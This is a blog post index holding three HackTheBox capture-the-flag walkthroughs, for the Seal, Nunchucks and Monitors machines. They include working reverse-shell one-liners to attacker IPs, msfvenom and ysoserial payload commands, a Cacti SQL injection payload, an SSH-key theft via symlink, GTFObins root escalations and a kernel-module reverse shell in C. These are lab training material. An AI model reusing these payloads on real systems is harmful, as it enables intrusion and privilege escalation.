"/posts/HTB-Seal/", "categories": "CTF, hackthebox", "tags": "htb, hackthebox, ctf, nmap, https, 443, sudo, tomcat, blackhat, orangetsai, parser, nginx, gitbucket, ansible, ansibleplaybook, playbook, war, msfvenom, synchronize, gtfobins, gtfo, sudo", "date": "2021-11-20 00:00:00 +0000", "snippet": "Machine informationSeal is very entertaining machine. First discovering Vhost of the machine and running ffuf against it showed few directories that were used in Apache Tomcat server. Another Service is running on port 8080, Gitbucket, after signing on the portal gave 2 repositories, in one of the repository’s commit had credentials for tomcat user, but tomcat login portal is being blocked by nginx configuration that are coded in the repository. To access the portal, tomcat and nginx has a flaw which was explained and how to exploit it in great BlackHat talk by OrangeTsai - Breaking the Parser. After abusing the flaw and uploading malicious war file and getting shell as tomcat user, I discovered some interesting files of Ansible Playbook, an Automation engine, I will abuse the playbook to get to luis user and after that I will exploit sudo capability of the luis user to get to root user.EnumerationnmapAs always I will scan for all the open ports with nmap which is highly revered network scanning tool in the inforsec community.Starting nmap with full port scanning without detecting services and storing the results into all file prepending with flag -oA. -p- : Specifies All ports 0-65535 -oA : To print output into files with extensions gnmap,xml,nmap, Here A stands for All. --min-rate= : When the –min-rate option is given Nmap will do its best to send packets as fast as or faster than the given rate. And I got the following result,$_ sudo nmap -p- -oA nmap/all 10.10.10.250 --min-rate=10000Nmap scan report for 10.10.10.250Host is up (0.30s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh443/tcp open https8080/tcp open http-proxyNmap done: 1 IP address (1 host up) scanned in 360.50 secondsNow I scan them to identify running services and nmap pre-installed scripts using -sV and -sC flags respectively$_ sudo nmap -sC -sV -p 22,443,8080 -oA nmap/all 10.10.10.250# Nmap 7.92 scan initiated Wed Nov 17 19:47:20 2021 as: nmap -sC -sV -p 22,443,8080 -oA nmap/all 10.10.10.250Nmap scan report for 10.10.10.250Host is up (0.21s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)| 256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)|_ 256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)443/tcp open ssl/http nginx 1.18.0 (Ubuntu)|_http-title: Seal Market| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK| Not valid before: 2021-05-05T10:24:03|_Not valid after: 2022-05-05T10:24:03|_ssl-date: TLS randomness does not represent time| tls-nextprotoneg: |_ http/1.1| tls-alpn: |_ http/1.1|_http-server-header: nginx/1.18.0 (Ubuntu)8080/tcp open http-proxy| fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 401 Unauthorized| Date: Wed, 17 Nov 2021 14:33:44 GMT| Set-Cookie: JSESSIONID=node018cpd9xw8xe6zlifq5ogn253e41.node0; Path=/; HttpOnly| Expires: Thu, 01 Jan 1970 00:00:00 GMT| Content-Type: text/html;charset=utf-8| Content-Length: 0| GetRequest: | HTTP/1.1 401 Unauthorized| Date: Wed, 17 Nov 2021 14:33:43 GMT| Set-Cookie: JSESSIONID=node0h2w0ecmom8hh9cnk1cxbdnl39.node0; Path=/; HttpOnly| Expires: Thu, 01 Jan 1970 00:00:00 GMT| Content-Type: text/html;charset=utf-8| Content-Length: 0| HTTPOptions: | HTTP/1.1 200 OK| Date: Wed, 17 Nov 2021 14:33:44 GMT| Set-Cookie: JSESSIONID=node0z7vt7nzatw9i1ry86g67uqt7b40.node0; Path=/; HttpOnly| Expires: Thu, 01 Jan 1970 00:00:00 GMT| Content-Type: text/html;charset=utf-8| Allow: GET,HEAD,POST,OPTIONS| Content-Length: 0| RPCCheck: | HTTP/1.1 400 Illegal character OTEXT=0x80| Content-Type: text/html;charset=iso-8859-1| Content-Length: 71| Connection: close| &amp;lt;h1&amp;gt;Bad Message 400&amp;lt;/h1&amp;gt;&amp;lt;pre&amp;gt;reason: Illegal character OTEXT=0x80&amp;lt;/pre&amp;gt;| RTSPRequest: | HTTP/1.1 505 Unknown Version| Content-Type: text/html;charset=iso-8859-1| Content-Length: 58| Connection: close| &amp;lt;h1&amp;gt;Bad Message 505&amp;lt;/h1&amp;gt;&amp;lt;pre&amp;gt;reason: Unknown Version&amp;lt;/pre&amp;gt;| Socks4: | HTTP/1.1 400 Illegal character CNTL=0x4| Content-Type: text/html;charset=iso-8859-1| Content-Length: 69| Connection: close| &amp;lt;h1&amp;gt;Bad Message 400&amp;lt;/h1&amp;gt;&amp;lt;pre&amp;gt;reason: Illegal character CNTL=0x4&amp;lt;/pre&amp;gt;| Socks5: | HTTP/1.1 400 Illegal character CNTL=0x5| Content-Type: text/html;charset=iso-8859-1| Content-Length: 69| Connection: close|_ &amp;lt;h1&amp;gt;Bad Message 400&amp;lt;/h1&amp;gt;&amp;lt;pre&amp;gt;reason: Illegal character CNTL=0x5&amp;lt;/pre&amp;gt;| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_ Server returned status 401 but no WWW-Authenticate header.|_http-title: Site doesn&#39;t have a title (text/html;charset=utf-8).1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port8080-TCP:V=7.92%I=7%D=11/17%Time=61950F21%P=x86_64-pc-linux-gnu%r(GSF:etRequest,F3,&quot;HTTP/1\\.1\\x20401\\x20Unauthorized\\r\\nDate:\\x20Wed,\\x2017\\x-- snip--SF:ontent-Length:\\x2071\\r\\nConnection:\\x20close\\r\\n\\r\\n&amp;lt;h1&amp;gt;Bad\\x20Message\\SF:x20400&amp;lt;/h1&amp;gt;&amp;lt;pre&amp;gt;reason:\\x20Illegal\\x20character\\x20OTEXT=0x80&amp;lt;/pre&amp;gt;&quot;);Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed Nov 17 19:48:35 2021 -- 1 IP address (1 host up) scanned in 75.76 secondsnmap gave hostname which I will add to my hostfile /etc/hosts 10.10.10.250 seal seal.htbwhat nmap did not gave me is an email address, After running nmap I checked the certificate file of the host. I will remember this just in case.Visiting Port 443This how the website looks like, there aren’t any interesting directories listed.I ran ffuf in the backgroud. ffuf is an fuzzing tool to look for any hidden directories.$_ ffuf -u https://seal.htb/FUZZ -w /opt/Tools/SecLists/Discovery/Web-Content/raft-small-words.txtadmin [Status: 302, Size: 0, Words: 1, Lines: 1]css [Status: 302, Size: 0, Words: 1, Lines: 1]js [Status: 302, Size: 0, Words: 1, Lines: 1]images [Status: 302, Size: 0, Words: 1, Lines: 1]manager [Status: 302, Size: 0, Words: 1, Lines: 1]. [Status: 200, Size: 19737, Words: 7425, Lines: 519]icon [Status: 302, Size: 0, Words: 1, Lines: 1]cmd [Status: 302, Size: 0, Words: 1, Lines: 1]After visiting /admin it was revealed to me that this is an Apache Tomcat 9.0.31 server. It is showing 404 for /admin and /cmd pages except it is showing 403 for/manager.GitbucketThere is also 8080 port open serving GitBucket. I signed up as amroot user and logged in.There are 2 repositories listed. Opening them revealed some usernames. rootluisalexFirstly, I looking at the seal_market respository. It is using nginx and tomcat servers. While looking at the commits, on commit ac210325afd2f6ae17cce84a8aa42805ce5fd010 there are tomcat credentials added.On the next commit 971f3aa3f0a0cc8aac12fd696d9631ca540f44c7 it was deleted. I don’t have access to login portal so I have to find a way to it.In the seal_market latest commit db85dc0136b335d873a07420aa8963491c6cd362 mentioned a ToDo list. Remove mutual authentication for dashboard, setup registration and login features. Deploy updated tomcat configuration. Disable manager and host-manager. Looking at commit information nginx configurations has been changed.After looking at the code, I googled for nginx mutual authentication and also because the server is nginx which I got from response header. Server: nginx/1.18.0 (Ubuntu)This blog post explains how to setup mutual auhentication in nginx server.After this I googled for nginx tomcat exploit, now there is a good blackhat talk from OrangeTsai ‘Breaking the Parser’ which explains POC on exploitation. This is the white paper for the talk.Shell as TomcatI used /foo;name=orange/bar/ payload from the talk changed it /manager;name=orange/html which prompted the login.I entered the creds which I found on commit and successfully logged in as tomcat user.I will just deploy malicious reverse shell war file using msfvenom. I used following command to create a war file. msfvenom -p java/shell_reverse_tcp lhost=10.10.14.120 lport=9001 -f war -o amroot.warI will deploy the file and that gave me a reverse shell.I upgraded my shell for better environment.Shell as LuisDiscovering Ansible PlaybookNow that I have proper envinronment. I started looking for interesting files and I came across Ansible directory in /opt/backups.What is Ansible Playbook?Ansible Playbooks offer a repeatable, re-usable, simple configuration management and multi-machine deployment system, one that is well suited to deploying complex applications. If you need to execute a task with Ansible more than once, write a playbook and put it under source control. Then you can use the playbook to push out new configuration or confirm the configuration of remote systems. The playbooks in the ansible-examples repository illustrate many useful techniques. You may want to look at these in another tab as you read the documentation.Playbooks can: declare configurations orchestrate steps of any manual ordered process, on multiple sets of machines, in a defined order launch tasks synchronously or asynchronouslyThe Playbooks are written in YAML languange.In the playbook directory there is only 1 file run.yml.- hosts: localhost tasks: - name: Copy Files synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes - name: Server Backups archive: path: /opt/backups/files/ dest: &quot;/opt/backups/archives/backup--.gz&quot; - name: Clean file: state: absent path: /opt/backups/files/There Are 3 tasks being run. Copy files is copying files from /var/lib/tomcat9/webapps/ROOT/admin/dashboard to /opt/backups/files folder using synchronize module and copy_symlink what is important here. Archive those files using archive module into /opt/backups/archives/backup-{timestamps}.gz Lastly delete folder ` /opt/backups/files/ using [File](https://docs.ansible.com/ansible/2.5/modules/archive_module.html#archive-module) module&#39;s state=absent` parameter.Abusing AnsibleI can abuse this copy_symlink parameter. Copy symlinks as the item that they point to (the referent) is copied, rather than the symlink.Firstly I have to find a writtable location inside /var/lib/tomcat9/webapps/ROOT/admin/dashboard folder.There is /uploads folder where I can write. Also in the archives folder is being written every 1 min.I can just “write” files from /home/luis/.ssh/id_rsa and playbook will do its thing.ln -s /home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploadsBefore *.gz files were 606047 bytes and now after symlinking new gerenerated file was 608923 bytes, looks like it worked!I transferred the backup.gz file on my ParrotOS and after extracting reveals id_rsa inside uploads directory. I will use this file to get ssh shell as luis user using ssh -i id_rsa luis@seal.Shell as rootAbusing sudo -lGetting root user was extremly easy. First thing I ran after getting shell as luis was sudo -l to look for any files I can run as root user. luis@seal:~$ sudo -l Matching Defaults entries for luis on seal: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin User luis may run the following commands on seal: (ALL) NOPASSWD: /usr/bin/ansible-playbook *I wrote small playbook from to ping back.After running the script I got ping from sealGTFObins POCI can run ansible-playbook binary as root user, I quickly jumped to GTFObins which showed following commands to get as root. I created root.sh file and transfered that file over to target machine.TF=$(mktemp)echo &#39;[{hosts: localhost, tasks: [shell: /bin/sh &amp;lt;/dev/tty &amp;gt;/dev/tty 2&amp;gt;/dev/tty]}]&#39; &amp;gt;$TFsudo ansible-playbook $TFAfter running file bash root.sh I was escalated to root user." }, { "title": "HackTheBox Nunchucks", "url": "/posts/HTB-Nunchucks/", "categories": "CTF, hackthebox", "tags": "htb, hackthebox, ctf, nmap, https, 443, ssti, cap_setuid, setuid, capability, linux, javascript, perl, apparmor, nunjucks, express, expressjs, template, injection, gtfobins, gtfo, shebang, launchpad", "date": "2021-11-09 00:00:00 +0000", "snippet": "Nunchucks is an Easy level box that is using ExpreessJS application template engine, Nunjucks, and later finding out its subdomain. On that subdomain Server Side Template Injection(SSTI) vulnerability is residing. Exploiting the vulnerability with POC and getting shell as user David. David has setuid capability on perl binary, later finding out that this binary has limited permissions from AppArmor and after understanding it we can exploit AppArmor using shebang to get root user.EnumerationNmapnmap is a is a network scanner. With feeding this an IP you can scan for its open ports and services running on it. This tool is exalted for its positive results in the InfoSec community.Starting nmap with full port scanning without detecting services and storing the results into all file prepending with flag -oA. -p- : Specifies All ports 0-65535 -oA : To print output into files with extensions gnmap,xml,nmap, Here A stands for All. --min-rate= : When the –min-rate option is given Nmap will do its best to send packets as fast as or faster than the given rate. And I got the following result,Nmap scan report for 10.10.11.122Host is up (0.35s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open http443/tcp open httpsNmap done: 1 IP address (1 host up) scanned in 383.21 secondsNow I scan them to identify running services and nmap pre-installed scripts using -sV and -sC flags respectively.Nmap scan report for 10.10.11.122Host is up (0.35s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)| 256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)|_ 256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to https://nunchucks.htb/|_http-server-header: nginx/1.18.0 (Ubuntu)443/tcp open ssl/http nginx 1.18.0 (Ubuntu)| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb| Not valid before: 2021-08-30T15:42:24|_Not valid after: 2031-08-28T15:42:24|_http-title: Nunchucks - Landing Page| tls-nextprotoneg: |_ http/1.1| tls-alpn: |_ http/1.1|_http-server-header: nginx/1.18.0 (Ubuntu)|_ssl-date: TLS randomness does not represent timeService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 35.29 secondsOn port 443, hostname is given by nmap output, I will quickly add it to my host file. 10.10.11.122 nunchucks.htb nunchucksEscalating to David userVisiting 10.10.11.122 or nunchucks.htb:80 redirects to https.There is a team listed at the bottom of the page, I made small list from them. mike page samnatha bloom nicolas ritcher mary longhorn susanne blake vanya dropperThere are login and signup pages also but both of them are throwing errors..Discovering store.nunchucks.htbIn the background, I was running ffuf to find any Vhosts and it found store.nunchucks.htb.ffuf -u https://nunchucks.htb/ -w /opt/Tools/SecLists/Discovery/Web-Content/raft-small-words.txt -H &quot;Host: FUZZ.nunchucks.htb&quot; -fl 547 -u : Provide URL to scan -w : Wordlist -H : Header, Here Header Host is used to scan for Vhosts. -fl : To filter lines in repsonse.Adding it to /etc/hosts 10.10.11.122 nunchucks.htb nunchucks store.nunchucks.htbAt the bottom of https://nunchucks.htb page was Store: Coming soon was written. It was hint for Vhost as well.Discovering SSTI on store.nunchucks.htbNow visting store.nunchucks.htb,I entered my email address in textbox and captured the request,After looking at the request and response, both are in JSON format and my input was reflected on response.Also noted that server is ExpressJS. Express.js, or simply Express, is a back end web application framework for Node.js.I tried XSS, SQL non of them gave me fruitful results. After keep looking for any perculiar behaviour I found that my input was rendered by back end engine.Googling for ExpressJS template engines lead me to a list of template engines used. Name of the box and this template engine sounds similar hence clearly shows that this is inteded vulnerability.I googled for Nunjucks template injection and it lead me to a blog site that showed POC on how to exploit data.I changed tail to cat and I got more data than previous response, I was able to extract whole /etc/passwd file. After looking at the /etc/passwd, user is David. So I tried extracting ssh key residing in home directory of david, but it is asking for password.Now I used nc reverse shell from pentestmonkey and I got shell as user. rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.25 9001 &amp;gt;/tmp/f While getting proper shell, this box is really sensitive I lost my reverse shell trying to put SSH key inside authorized_keys. Anyway I did that from burp suite.I got proper SSH shell.Getting rootsetuid capabilityUser David has one interesting capability, he can run perl commands with setuid capability.I head over to GTFObins and copied their capability payload but I did not get shell as root.After looking for more information, I came across some interesting files in /opt directory.david@nunchucks:/opt$ ls -latotal 16drwxr-xr-x 3 root root 4096 Oct 28 17:03 .drwxr-xr-x 19 root root 4096 Oct 28 17:03 ..-rwxr-xr-x 1 root root 838 Sep 1 12:53 backup.pldrwxr-xr-x 2 root root 4096 Nov 8 11:41 web_backupslooking at the backup.pl file,#!/usr/bin/perluse strict;use POSIX qw(strftime);use DBI;use POSIX qw(setuid); POSIX::setuid(0); my $tmpdir = &quot;/tmp&quot;;my $backup_main = &#39;/var/www&#39;;my $now = strftime(&quot;%Y-%m-%d-%s&quot;, localtime);my $tmpbdir = &quot;$tmpdir/backup_$now&quot;;sub printlog{ print &quot;[&quot;, strftime(&quot;%D %T&quot;, localtime), &quot;] $_[0]\\n&quot;;}sub archive{ printlog &quot;Archiving...&quot;; system(&quot;/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2&amp;gt;/dev/null&quot;); printlog &quot;Backup complete in $tmpbdir/backup_$now.tar&quot;;}if ($&amp;gt; != 0) { die &quot;You must run this script as root.\\n&quot;;}printlog &quot;Backup starts.&quot;;mkdir($tmpbdir);&amp;amp;archive;printlog &quot;Moving $tmpbdir/backup_$now to /opt/web_backups&quot;;system(&quot;/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/&quot;);printlog &quot;Removing temporary directory&quot;;rmdir($tmpbdir);printlog &quot;Completed&quot;;This file on execution zipping files from web directory to /opt/web_backups also it is using POSIX to setuid(0) i.e. setting it to root.AppArmorIt is using AppArmor for execution. AppArmor limits resources for programs and its profiles allows user capability. Looking at the profile in /etc/apparmor.d,david@nunchucks:/etc/apparmor.d$ ls -la-- snip ---rw-r--r-- 1 root root 442 Sep 26 01:16 usr.bin.perl-- snip --Reading file showed that perl is denied rwx access on /root, while it can run later commands such as id , ls, cat, whoami and file in /opt/backup.pl directory.# Last Modified: Tue Aug 31 18:25:30 2021#include &amp;lt;tunables/global&amp;gt;/usr/bin/perl { #include &amp;lt;abstractions/base&amp;gt; #include &amp;lt;abstractions/nameservice&amp;gt; #include &amp;lt;abstractions/perl&amp;gt; capability setuid, deny owner /etc/nsswitch.conf r, deny /root/* rwx, deny /etc/shadow rwx, /usr/bin/id mrix, /usr/bin/ls mrix, /usr/bin/cat mrix, /usr/bin/whoami mrix, /opt/backup.pl mrix, owner /home/ r, owner /home/david/ r,}Let’s try those commands,Bug from launchpad shows that adding Shebang(#) will bypass security checks and execute arbitrary script.I created small script mentioned before from GTFObins, and added shebang #!/usr/bin/perl use POSIX qw(setuid); POSIX::setuid(0); exec “/bin/sh”;gave the script +x permission chmod +x shell.pland voilà I got root." }, { "title": "HackTheBox Monitors", "url": "/posts/HTB-Monitors/", "categories": "CTF, hackthebox", "tags": "htb, hackthebox, ctf, nmap, apache, ofbiz, 8443, deepce, rfi, wordpress, cap_sys_module, capability, linux, cve, 2020-9496, xml, java, xmlrpc, rpc, sql, solr", "date": "2021-10-31 00:00:00 +0000", "snippet": "Machine InformationMonitors is a hard difficulty machine that starts with a vulnerable RFI plugin on a WordPress site. I acquire information on different vHosts hosting vulnerable cactus after some enumeration, which leads to code execution through SQL command. From there, I went to user and discovered a docker container running the vulnerable Apache OFbiz, which I exploited by installing a malicious kernel module and gaining root access to the host.EnumerationNmapnmap is a is a network scanner. With feeding this an IP you can scan for its open ports and services running on it. This tool is exalted for its positive results in the InfoSec community.Lets start using it,sudo nmap -p- -oA nmap/all 10.10.10.238 --min-rate=10000Here,-p- : Specifies All ports 0-65535-oA : To print output into files with extensions gnmap,xml,nmap, Here A stands for All.--min-rate= : When the –min-rate option is given Nmap will do its best to send packets as fast as or faster than the given rate.And I got the following result,Nmap scan report for 10.10.10.238Host is up (0.31s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpNmap done: 1 IP address (1 host up) scanned in 307.22 secondsNow I scan them to identify running services and nmap pre-installed scripts using -sV and -sC flags respectively.Nmap scan report for 10.10.10.238Host is up (0.26s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)| 256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)|_ 256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: Site doesn\\&#39;t have a title (text/html; charset=iso-8859-1).|_http-server-header: Apache/2.4.29 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 16.21 secondsSo there are only 2 ports are open, 22 - ssh : OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80 - http : Apache httpd 2.4.29After googling these version the potential host is Ubuntu 18.04 Bionic. Not that it matters for now!Visiting Port 80The web page looks like this,Since it is saying monitors.htb, I added it to the host file /etc/hosts 10.10.10.238 monitors.htbI started to look for any esoteric VHosts using ffuf, Fuzz Faster U Fool (ffuf) is a Fuzzer written in GO language read it here, by following command:ffuf -u http://monitors.htb -w /opt/Tools/SecLists/Discovery/Web-Content/raft-small-words.txt -H &quot;Host: FUZZ.monitors.htb&quot; -fl 1Here, -u : refers to URL to scan -w : Wordlist containing some spicy words -H : To edit and send header to scan Hosts with FUZZ keyword -fl : Refers to Filter LineThis is how the site looks after adding hostname to host file.At the bottom, It is saying Wordpress. So I ran wpscan against the website, with following flags:wpscan --url http://monitors.htb/ -e ap --detection-mode aggressive -v --url : URL to scan -e ap : This will enumerate all plugins that are used in the site. --detection-mode aggressive : Will scan for information more aggressively. -v : This will print verboselyThe tool has given quite an information but interesting is the wp-with-spritz plugin.RFI on PluginSo, The plugin is vulnerable to RFI. I search for this plugin under searchsploit it gave me 44544.php this file explaining the Proof of Concept for this exploit. if(isset($_GET[‘url’])){$content=file_get_contents($_GET[‘url’]);Above code is present inside the plugin file, and POC explains to ways to extract information, /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec I tried first and successfully got /etc/passwd file, I also tried to extract .ssh/id_rsa from user’s home directory but server only replied with empty page. At this point I am Assuming user did not have ssh login configured for himself or some permission is blocking the contents.I looked at the /etc/apache2/sites-enabled/000-default.conf and it showed two config files on on respective VHosts, there is one VHost that was hiding in the dark. monitors.htb.conf cacti-admin.monitors.htb.confI added it to a host file. 10.10.10.238 monitors.htb cacti-admin.monitors.htb cactiAnd visited the site. Below is the face of it.I tried the dictionary attack against it, but none of it gave fructive result. So I started to enumerate for credentials.This time I hunt for wordpress config file residing in /var/www/wordpress/wp-config.php, and I get username as well as password.I used those wpadmin:BestAdministrator@2020! credentials to login onto the portal, after just changing wpadmin to admin I was successfull in logging in.Above image shows post logging-in page with Version 1.2.12 indicated on the top right side, searchsploit shows this version is exploitable to &#39;filter&#39; SQL Injection / Remote Code Execution. Refering the 49810.py for POC, It says that /cacti/color.php?action=export&amp;amp;header=false&amp;amp;filter=1 is vulnerable, but you have to visit /cacti/host.php?action=reindex to trigger the payload.The Payload is used in 3 chunks &#39;)+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value=&#39;{rshell};&#39;+where+name=&#39;path_php_binary&#39;;--+-Using first chunk I am able to get credentials of users,Which means exploit Indeed this works in this machine but before doing that lets ping to our machine.So, the payload for ping is &#39;)+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value=&#39;ping+-n+2+10.10.14.31;&#39;+where+name=&#39;path_php_binary&#39;;--+-As you can see we get a ping back.Now, lets try to get reverse shell. But I was getting nothing back this time. Not sure what happened so I reboot the box and sent the payload again,this time I get reverse shell as www-data user.Now let’s get proper shell with python3 as follows:So there was /usr/share/cacti/cacti/include/config.php files in which some credentials was store, I used them to login into mysql service but my request was declined. ERROR 1045 (28000): Access denied for user ‘cacti’@’localhost’ (using password: YES)I started to poke around the machine to see any handy information leading to anywhere. In /home/marcus/ directory, .backup/ and notes.txt was throwing Permission denied errors. Now exploiring again and I find interesting service running inside /etc/systemd/system/ and we as a user can read this file. lrwxrwxrwx 1 root root 40 Nov 10 2020 cacti-backup.service -&amp;gt; /lib/systemd/system/cacti-backup.serviceHere l in lrwxrwxrwx defines symbolic link.Inside the file: [Unit]Description=Cacti Backup ServiceAfter=network.target[Service]Type=oneshotUser=www-dataExecStart=/home/marcus/.backup/backup.sh[Install]WantedBy=multi-user.target\\I can read /home/marcus/.backup/backup.sh file since it is owned by www-data user.Inside backup.sh file: #!/bin/bashbackup_name=”cacti_backup”config_pass=”VerticalEdge2020”zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*sshpass -p “${config_pass}” scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.ziprm /tmp/${backup_name}.zip\\I tried logging in with our python3 shell from su marcus - command but it was giving error. So, I logged in through SSH.There is a note.txt file residing in user’s home directory and it is a TO-DO list to update docker image file which is unchecked. It hints that I might be inside docker container or I have to enumerate more on how container. marcus@monitors:~$ cat note.txt TODO:Disable phpinfo in php.ini - DONEUpdate docker image for production use -I ran deepce.sh, it says that we are not inside container. Also there is not /.docker/ directory inside root directory. So, It’s time to get more infomation about this machine.I looked for any local port listening and there are two 8443 and 3306 ports listening. 8443 - I have no clue on what service this port is using. 3306 - Usually, MySql uses this port.I tried logging in using marcus credentials on mysql service but I get access denied.Port 8443Since the machine does not have wget or curl I can not directly interact with the port. I have to use SSH port forwarding to access the port. To forward port on just type ~C on fresh terminal. marcus@monitors:~$ ssh&amp;gt; -L 8443:127.0.0.1:8443Forwarding port. -L - So any traffic hitting my 8443 port will be forwarded to Monitor’s 8443 port. myport:destination:port-to-forwardVisiting the page it says TLS is required, Now we jump from http to https.I have started ffuf to look for any exclusive directory that will lead me closer to knowing service and I get myportal directory.I visted the path which redirected me to login portal, At the bottom you can see it is Apache OFbiz v17.12.01.Running this version under searchploit provided ApacheOfBiz 17.12.01 - Remote Command Execution (RCE) via Unsafe Deserialization of XMLRPC arguments exploit.Apache OFbizThe vulnerabilty explainaion from Zero Day Initiative says the vulnerability arrises due to Java serialization issues when processing requests sent to /webtools/control/xmlrpc. A remote unauthenticated attacker can exploit this vulnerability by sending a crafted request. Successful exploitation would result in arbitrary code execution.Visiting https://localhost:8443/webtools/control/xmlrpc site throws an error.I googled for Apache OFbiz exploit POC 2020-9496 and a bunch of results came. Since they are all same methods on getting a revese shell, I chose for g33xter’s POC. you can follow it on his github profile, click here.POC to getting root: First I have created a bash reverse shell file calling it shell.sh . #!/bin/bash /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.55/9001 0&amp;gt;&amp;amp;1 Then I downloaded ysoserial.jar file from official repository. you have click here to visit their page. Now I will generate payload to download shell.sh. It will give out very long base64 encoded payload. java -jar ysoserial.jar CommonsBeanutils1 &quot;wget 10.10.14.55/shell.sh -O /tmp/shell.sh&quot; | base64 | tr -d &quot;\\n&quot; I will start my python3 server where my shell.sh file is residing. python3 -m http.server Then I sent the payload from BurpSuite using provided code from repository. It hit my python server and got the file successfully. Now I will create new payload to execute bash file downloaded in /tmp/shell.sh directory. Sent the payload again from burpsuite. As you can see I successfully got my reverseshell. Looking at the hostname, I am certainly inside a docker, and I have to find a way to get out it.This time again after running deepce.sh, it returned two highlighted capabilities and showed two files inside root directory.Files are kernel modules;[+] Interesting files in root ........... Yes /linux-headers-4.15.0-132_4.15.0-132.136_all.deb /linux-headers-4.15.0-132-generic_4.15.0-132.136_amd64.deb This looks like potential path to exploit.I will first go with cap_sys_module. For this exploit I refered to this blog from Pentester’s Academy. It showed I need to make two different files shell.c and Makefile. I will just copy the source code and replace IP address to mine naming it shell.c .#include &amp;lt;linux/kmod.h&amp;gt;#include &amp;lt;linux/module.h&amp;gt;MODULE_LICENSE(&quot;GPL&quot;);MODULE_AUTHOR(&quot;AttackDefense&quot;);MODULE_DESCRIPTION(&quot;LKM reverse shell module&quot;);MODULE_VERSION(&quot;1.0&quot;);char* argv[] = {&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.55/9001 0&amp;gt;&amp;amp;1&quot;, NULL};static char* envp[] = {&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;, NULL };static int __init reverse_shell_init(void) { return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);}static void __exit reverse_shell_exit(void) { printk(KERN_INFO &quot;Exiting\\n&quot;);}module_init(reverse_shell_init);module_exit(reverse_shell_exit); Then create a Makefile.obj-m +=shell.oall: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modulesclean: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) cleanNow that I have both files under one directory. Its time to just type make . This will compile shell.c file and breed lots of files. Now I just have to insert our malicious kernel module inside in machine, using insmod shell.ko and I get reverse shell on my netcat listener." } ]
